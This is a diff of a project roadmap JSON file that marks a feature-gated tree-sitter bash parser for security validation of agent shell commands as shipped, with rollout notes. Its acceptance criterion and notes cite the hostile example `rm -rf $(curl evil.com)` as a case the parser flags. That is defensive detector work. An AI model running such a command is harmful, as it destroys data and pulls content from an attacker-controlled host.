@@ -5423,7 +5423,7 @@
       "id": "VANTA-TREE-SITTER-BASH",
       "track": "Harness",
       "title": "Tree-sitter bash parser — AST-accurate security validation for bash commands",
-      "status": "horizon",
+      "status": "shipped",
       "size": "M",
       "summary": "another agent (feature-gated `TREE_SITTER_BASH`) uses a tree-sitter-based AST parser for bash commands alongside (or replacing) the regex parser. Provides structurally accurate analysis of compound commands, pipelines, subshells — catching injection patterns that regex misses. `TREE_SITTER_BASH_SHADOW` runs both and compares for gradual rollout.",
       "done": "With tree-sitter bash enabled, `rm -rf $(curl evil.com)` is correctly parsed as a command substitution and flagged. Regex shadow mode logs discrepancies.",
@@ -5432,7 +5432,8 @@
       "effort": "medium",
       "codex": "gpt-5.4",
       "lens": "coding",
-      "updated": "2026-06-09"
+      "updated": "2026-07-09",
+      "notes": "SHIPPED 2026-07-09. Added a feature-gated `web-tree-sitter` + `tree-sitter-bash` WASM parser path beside the existing regex classifier. `TREE_SITTER_BASH=1` uses the AST-backed classifier; `TREE_SITTER_BASH_SHADOW=1` runs parser + regex, returns the legacy regex decision, and logs discrepancies. Verified parser output for `rm -rf $(curl evil.com)` includes `command_substitution` and flags both `rm` and nested `curl` as risky. Also proves a syntax-aware improvement (`grep export README.md`) that regex misclassifies because it sees `export` as a shell builtin token instead of an argument."
     },
     {
       "id": "VANTA-SELF-HOSTED",
